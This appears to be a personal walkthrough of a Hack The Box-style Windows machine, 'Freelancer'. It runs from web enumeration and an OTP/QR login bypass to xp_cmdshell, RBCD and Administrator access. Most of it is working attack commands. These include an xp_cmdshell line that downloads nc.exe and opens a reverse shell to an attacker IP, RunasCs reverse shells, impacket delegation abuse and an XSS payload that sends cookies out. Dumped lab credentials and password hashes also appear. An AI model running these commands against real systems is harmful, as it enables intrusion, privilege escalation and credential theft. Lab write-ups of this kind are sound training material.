# Information
- CTF Name: 
- CTF Level:
- CTF Description: 
- Date: 
- Platform: 
- Category: 

# Findings

## External
### Enumeration
![](https://i.imgur.com/8bty2TL.png)
![](https://i.imgur.com/0cbqrfR.png)

![](https://i.imgur.com/WHVyMsD.png)
```shell
rexder@HunterMachine ~> crackmapexec smb 10.129.199.162 --shares
SMB         10.129.199.162  445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:freelancer.htb) (signing:True) (SMBv1:False)
```
https://github.com/ly4k/CallbackHell


- Users
Tom Hazard
Martin Rose
Crista Watterson
Anna Watterson
Camellia Renesa
Sara Arkhader
Jonathon Roman
John Carter
Mark Rose
![](https://i.imgur.com/hTiHr2i.png)
![](https://i.imgur.com/KHqQn0E.png)
- I got this on the recovery page, but before this when i try to register employer acc i was asked same question. the problem was my account was not active. so, i used that information here.
- it worked!!! ![](https://i.imgur.com/EWQLUw7.png)
- Then i logged in and it worked!.
- I saw a QR-code and when i scan it it has a Base64 of id, the qr code is used to login users with no pass. then i used the admin ID(http://freelancer.htb/accounts/profile/visit/2/) and changed it to base64 and used the qr Code and i got the admin page
```shell
rexder@HunterMachine ~/C/H/M/freelancer> echo 2 | base64
Mgo=

http://freelancer.htb/accounts/login/otp/MTAwMTI=/ad65a6aa14b921ede85842df553cd974/
```
![](https://i.imgur.com/isEbok5.png)
- I got nothing. So i Went pack and i tried to do the same with the password change page.
	- ![](https://i.imgur.com/PwddrZL.png)
- nothing here, Then after some pocking around i remembered that i have got the `/admin` on my first enumeration process, so now am admin then i tried it and i got admin page. with sql terminal.
	- ![](https://i.imgur.com/i9uPXFc.png)
```sql
# DB
|name|
|---|
|master|
|tempdb|
|model|
|msdb|
|Freelancer_webapp_DB|


# Tables of Fre...
|TABLE_CATALOG|TABLE_SCHEMA|TABLE_NAME|TABLE_TYPE|
|---|---|---|---|
|Freelancer_webapp_DB|dbo|django_migrations|BASE TABLE|
|Freelancer_webapp_DB|dbo|freelancer_customuser|BASE TABLE|
|Freelancer_webapp_DB|dbo|freelancer_article|BASE TABLE|
|Freelancer_webapp_DB|dbo|freelancer_job|BASE TABLE|
|Freelancer_webapp_DB|dbo|freelancer_otptoken|BASE TABLE|
|Freelancer_webapp_DB|dbo|freelancer_employer|BASE TABLE|
|Freelancer_webapp_DB|dbo|freelancer_freelancer|BASE TABLE|
|Freelancer_webapp_DB|dbo|freelancer_comment|BASE TABLE|
|Freelancer_webapp_DB|dbo|freelancer_job_request|BASE TABLE|
|Freelancer_webapp_DB|dbo|django_content_type|BASE TABLE|
|Freelancer_webapp_DB|dbo|django_admin_log|BASE TABLE|
|Freelancer_webapp_DB|dbo|auth_permission|BASE TABLE|
|Freelancer_webapp_DB|dbo|auth_group|BASE TABLE|
|Freelancer_webapp_DB|dbo|auth_group_permissions|BASE TABLE|
|Freelancer_webapp_DB|dbo|django_session|BASE TABLE|


|d|password|last_login|username|email|first_name|last_name|is_active|is_staff|is_superuser|security_q1|security_q2|security_q3|failed_login_attempts|address|joined_at|image|user_type|
|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|

|10012|pbkdf2_sha256$600000$BuGQLvFbWtWLyPTwpVrVUf$fYiR7XgA0BgvwVviKf0eqgQmU55+yEvPTzyVIYIu924=|2024-06-02T15:50:42.289|rexder2|rex2@gmail.com|nat|hai|true|false|false|
```
![Uploading file...v8kim]()
### Gaining Access
```shell
EXECUTE AS LOGIN = 'sa'
EXECUTE SP_CONFIGURE "show advanced options", 1
RECONFIGURE

EXECUTE AS LOGIN = 'sa'
EXECUTE sp_configure 'xp_cmdshell', 1
RECONFIGURE

EXECUTE AS LOGIN = 'sa'
EXEC xp_cmdshell 'cd C:\Users\sql_svc && curl -O http://10.10.14.99:8090/nc.exe && C:\Users\sql_svc\nc.exe 10.10.14.99 443 -e powershell.exe'

```
![](https://i.imgur.com/QfflxPQ.png)

```
iwr -uri http://10.10.14.99/runascs.ps1 -outfile runas.ps1

Invoke-Rexder -CollectionMethods All

iwr -uri http://10.10.14.99/rexview.ps1 -outfile rexview.ps1
```
## Internal
### Enumeration
![](https://i.imgur.com/EZq8BcJ.png)
```shell
PS C:\Users\sql_svc\Downloads\SQLEXPR-2019_x64_ENU> cat sql-Configuration.INI
cat sql-Configuration.INI
[OPTIONS]
ACTION="Install"
QUIET="True"
FEATURES=SQL
INSTANCENAME="SQLEXPRESS"
INSTANCEID="SQLEXPRESS"
RSSVCACCOUNT="NT Service\ReportServer$SQLEXPRESS"
AGTSVCACCOUNT="NT AUTHORITY\NETWORK SERVICE"
AGTSVCSTARTUPTYPE="Manual"
COMMFABRICPORT="0"
COMMFABRICNETWORKLEVEL=""0"
COMMFABRICENCRYPTION="0"
MATRIXCMBRICKCOMMPORT="0"
SQLSVCSTARTUPTYPE="Automatic"
FILESTREAMLEVEL="0"
ENABLERANU="False"
SQLCOLLATION="SQL_Latin1_General_CP1_CI_AS"
SQLSVCACCOUNT="FREELANCER\sql_svc"
SQLSVCPASSWORD="IL0v3ErenY3ager"
SQLSYSADMINACCOUNTS="FREELANCER\Administrator"
SECURITYMODE="SQL"
SAPWD="t3mp0r@ryS@PWD"
ADDCURRENTUSERASSQLADMIN="False"
TCPENABLED="1"
NPENABLED="1"
BROWSERSVCSTARTUPTYPE="Automatic"
IAcceptSQLServerLicenseTerms=True
```
- I did password Spraying and i got `mikasaAckerman : IL0v3ErenY3ager`
```shell
Invoke-RunasCs -Username mikasaAckerman -Password 'IL0v3ErenY3ager' -Command 'c:\users\public\nc.exe 10.10.14.99 8020 -e powershell.exe'


Invoke-RunasCs -Username lorra199 -Password 'v3ryS0l!dP@sswd#29' -Command 'c:\users\public\nc.exe 10.10.14.99 8021 -e powershell.exe'

```
![](https://i.imgur.com/EcJ9fJO.png)
![](https://i.imgur.com/cfMIt5X.png)
```
Hello Mikasa,
I tried once again to work with Liza Kazanoff after seeking her help to troubleshoot the BSOD issue on the "DATACENTER-2019" computer. As you know, the problem started occurring after we installed the new update of SQL Server 2019.
I attempted the solutions you provided in your last email, but unfortunately, there was no improvement. Whenever we try to establish a remote SQL connection to the installed instance, the server's CPU starts overheating, and the RAM usage keeps increasing until the BSOD appears, forcing the server to restart.
Nevertheless, Liza has requested me to generate a full memory dump on the Datacenter and send it to you for further assistance in troubleshooting the issue.
Best regards,
```
### Gaining Access
- This is windows memory dump so i used the `memprocfs` tool
```shell
rexder@HunterMachine ~/Exploit> sudo ./memprocfs -device ~/CTF/HTB/Machines/freelancer/MEMORY.DMP -forensic 1 -license-accept-elastic-license-2-0 -mount /mnt/ctf
[SYMBOL]   Functionality may be limited. Extended debug information disabled.
[SYMBOL]   Partial offline fallback symbols in use.
[SYMBOL]   For additional information use startup option: -loglevel symbol:4
[SYMBOL]   Reason: Unable to download kernel symbols to cache from Symbol Server.

Initialized 64-bit Windows 10.0.17763
[PLUGIN]   Python plugin manager failed to load.

==============================  MemProcFS  ==============================
 - Author:           Ulf Frisk - pcileech@frizk.net
 - Info:             https://github.com/ufrisk/MemProcFS
 - Discord:          https://discord.gg/pcileech
 - License:          GNU Affero General Public License v3.0
   ---------------------------------------------------------------------
   MemProcFS is free open source software. If you find it useful please
   become a sponsor at: https://github.com/sponsors/ufrisk Thank You :)
   ---------------------------------------------------------------------
 - Version:          5.9.16 (Linux)
 - Mount Point:      /mnt/ctf
 - Tag:              17763_a3431de6
 - Operating System: Windows 10.0.17763 (X64)
==========================================================================

[FORENSIC] Forensic mode completed in 22s
```
- using secrets dump i extracted the hash
![](https://i.imgur.com/5kJnaBG.png)

```shell
Administrator:500:aad3b435b51404eeaad3b435b51404ee:725180474a181356e53f4fe3dffac527:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:04fc56dd3ee3165e966ed04ea791d7a7:::
[*] Dumping cached domain logon information (domain/username:hash)
FREELANCER.HTB/Administrator:$DCC2$10240#Administrator#67a0c0f193abd932b55fb8916692c361: (2023-10-04 12:55:34)
FREELANCER.HTB/lorra199:$DCC2$10240#lorra199#7ce808b78e75a5747135cf53dc6ac3b1: (2023-10-04 12:29:00)
FREELANCER.HTB/liza.kazanof:$DCC2$10240#liza.kazanof#ecd6e532224ccad2abcf2369ccb8b679: (2023-10-04 17:31:23)
```
- ` lorra199 : PWN3D#l0rr@Armessa199 `
![](https://i.imgur.com/8WKf9dq.png)
- It is on the AD Recycle group so we can get the deleted things
	- ![](https://i.imgur.com/krJa0RI.png)
- But there is nothing to look for so when i check back to my bloodhound. i saw that the ad recycle is generic write on the dc
```shell
rexder@HunterMachine ~> impacket-addcomputer 'freelancer.htb/lorra199:PWN3D#l0rr@Armessa199' -dc-ip 10.129.194.233 -computer-name rexder -computer-pass 'password@123'
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Successfully added machine account rexder$ with password password@123.
                                                  ^
rexder@HunterMachine ~> impacket-rbcd -action write -delegate-from "rexder\$" -delegate-to "dc\$" freelancer.htb/'lorra199':'PWN3D
#l0rr@Armessa199' -dc-ip 10.129.194.233

Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] rexder$ can now impersonate users on dc$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     rexder$      (S-1-5-21-3542429192-2036945976-3483670807-11601)

rexder@HunterMachine ~> impacket-getST -spn cifs/dc.freelancer.htb -impersonate Administrator -dc-ip 10.129.194.233 freelancer.htb/'rexder$:hackyou@123'


Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_dc.freelancer.htb@FREELANCER.HTB.ccache

rexder@HunterMachine ~> export KRB5CCNAME=`pwd`/Administrator@cifs_dc.freelancer.htb@FREELANCER.HTB.ccache

rexder@HunterMachine ~ [1]> klist
Ticket cache: FILE:/home/rexder/Administrator@cifs_dc.freelancer.htb@FREELANCER.HTB.ccache
Default principal: Administrator@freelancer.htb

Valid starting     Expires            Service principal
06/03/24 19:09:28  06/04/24 05:09:26  cifs/dc.freelancer.htb@FREELANCER.HTB
	renew until 06/04/24 19:09:26

rexder@HunterMachine ~ [1]> impacket-wmiexec -k dc.freelancer.htb
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>cd Users\Administrator\Desktop
C:\Users\Administrator\Desktop>cat root.txt

```
### Maintaining Access


# Random Notes

```shell

<script>document.location='http://10.10.14.99:8003?c='+document.cookie</script>

contact                 [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 466ms]
admin                   [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 593ms]
blog                    [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 740ms]
about                   [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 129ms]
add_comment             [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 708ms]


johnHalond@freelancer.htb  -> admin
tomHazard@freelancer.htb
martin.rose@hotmail.com
crista.Watterson@gmail.com
Camellia@athento.com
lisa.Arkhader@outlook.com
SaraArkhader@gmail.com
maya001@hotmail.com
jroman1992@gmail.com
johnholand@secretareas.com
mark.rose@yahoo.com
itachi.uchiha@gmail.com


```